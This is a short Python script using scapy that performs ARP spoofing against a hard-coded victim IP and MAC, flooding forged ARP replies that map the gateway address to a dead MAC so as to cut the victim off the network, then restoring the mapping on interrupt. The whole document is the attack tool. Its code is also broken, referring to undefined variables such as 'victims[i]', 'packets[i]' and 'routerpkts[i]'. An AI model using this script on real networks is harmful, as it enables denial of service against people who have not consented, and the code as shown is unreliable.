#!/usr/bin/env python

from scapy.all import *
import time
import signal
import sys

victimIP = "192.168.56.105"
victimMAC = "08:00:27:49:32:8b"

myMAC = "08:00:27:f7:e8:72"


deadEndIP = "192.168.1.1"
deadEndMAC = "84:a6:c8:af:12:ed"

killMAC = "08:00:27:ff:ff:fe"


pkt = Ether()/ARP()
pkt.dst = victims[i][1]
pkt.src = myMAC

pkt.hwsrc = killMAC
pkt.hwdst = victims[i][1]
pkt.pdst= victims[i][0]
pkt.psrc = deadEndIP
pkt.op = 2

print("Turn out the lights....")

try:
	while True:
		sendp(packets[i], iface="eth0")
		sendp(routerpkts[i], iface="eth0")
		time.sleep(2)

except KeyboardInterrupt:
	print("Re-ARPing....")
	heal = Ether()/ARP()
	heal.src = myMAC
	heal.dst = victimMAC
	heal.hwsrc = deadEndMAC
	heal.hwdst = victimMAC
	heal.pdst = victimIP
	heal.psrc = deadEndIP
	heal.op = 2

	sendp(heal, iface="eth0")
	time.sleep(1)

	sys.exit(0)
